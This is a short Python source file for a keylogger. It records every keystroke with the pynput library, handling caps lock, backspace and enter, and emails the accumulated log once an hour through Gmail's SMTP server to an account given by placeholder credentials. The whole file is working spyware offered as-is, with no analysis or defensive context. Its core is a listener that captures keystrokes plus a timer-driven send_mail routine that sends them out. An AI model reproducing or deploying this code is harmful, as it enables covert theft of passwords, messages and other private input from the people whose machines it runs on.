import pynput.keyboard as keyboard
import threading
import smtplib

log = ""
caps = False
count = 0

def grab_keys(key):
    global log,caps,count
    case = False 
    try:
        
        if caps:
            log=log+str(key.char).swapcase()
          
        else :
            log = log+str(key.char)
            
    except Exception:
          if str(key) == 'Key.space':
              log+=" "
              
          elif str(key) == 'Key.shift':
            pass
          
          elif str(key)== 'Key.backspace':
              log = log[:-1]
          elif str(key) == 'Key.caps_lock':
              caps = True
              count+=1
              if count>1:
                 count = 0
                 caps = False
          elif str(key) =='Key.enter':
              log +='\n'
     
          else :
               log+=" " + str(key)+" "  
               
               
email = " Enter your email id "
passworld = " Enter your passworld"
log


def send_mail(email,password,log):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email, passworld)
    server.sendmail(email,email,log)
    server.quit()
    

def report():
    global log
    send_mail(email,passworld,log)
    #print(log)
    log = ""
    timer = threading.Timer(3600,report) 
    timer.start()
  
listener = keyboard.Listener(on_press = grab_keys) 
with listener:
    report()
    listener.join()        

send_mail(email,passworld,log)
 
